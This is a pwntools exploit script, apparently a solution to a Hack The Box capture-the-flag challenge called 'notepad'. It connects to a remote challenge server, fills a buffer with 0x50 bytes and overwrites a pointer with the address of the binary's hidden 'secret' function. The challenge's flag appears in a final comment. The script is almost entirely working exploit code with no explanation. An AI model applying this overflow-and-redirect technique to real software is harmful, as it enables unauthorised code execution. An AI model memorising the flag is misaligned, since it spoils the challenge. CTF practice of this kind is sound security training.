from pwn import *

# s= process('./notepad')
s = remote("46.101.23.188",32663)
elf = ELF('./notepad')
pause()
secret_func = elf.symbols['secret']
log.info("secret at: 0x%x"%secret_func)
def add_note(size,note):
    s.sendlineafter(">","1")
    s.sendlineafter('size',str(size))
    s.sendlineafter("Note:",str(note))

payload = b'n'*0x50+ p64(secret_func)*2

add_note(10,'tuanle')
add_note(10,'tuanle')
add_note(10,'tuanle')

s.sendlineafter("do you want to use it? (y/n)",payload)
# s.sendlineafter('size',str(10))
# s.sendlineafter("Note:","lala")
s.interactive()
s.close()
# HTB{4lw4ys_ch4ck_l3ngth_0f_n0t3s}